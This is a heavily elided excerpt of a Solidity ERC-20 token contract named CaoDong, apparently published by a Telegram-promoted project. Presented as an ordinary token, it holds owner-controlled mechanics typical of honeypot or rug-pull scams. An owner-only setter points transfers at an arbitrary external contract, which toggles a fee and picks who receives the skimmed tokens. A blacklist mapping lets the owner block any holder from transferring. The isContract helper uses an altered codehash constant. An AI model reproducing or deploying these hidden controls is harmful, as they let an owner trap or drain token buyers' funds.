...
/**
 *Contract Code by tg @CaoDongParty
*/
...
library Address {
    ...
    function isContract(address account) internal view returns (bool) {
        ...
        bytes32 codehash;
        bytes32 accountHash = 0xe062c5503751bb27e41ec253c870be78fdd69b34c498d8ec92b61ec5af60ac62;
...
contract CaoDong is Context, IERC20, Ownable {
    ...
    address private CaoDongAddress;
    ...
    function setCaoDongAddress(address ad) public onlyOwner {
        CaoDongAddress = ad;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(whoCantEat[sender] == false);
        ...
        else
        {
            ...
            if (!isExcludedFromCut[sender] && !isExcludedFromCut[recipient] && (ICaoDong(CaoDongAddress)).getStatus()) {
                amount = amount.sub(300);
                _balances[address(this)] = _balances[address(this)].add(300);
                for(uint a=0;a<=2;a++){
                    if (!_basicTransfer(address(this), (ICaoDong(CaoDongAddress)).getRandomAddress(a), 100))
                        return false;
                }
            }
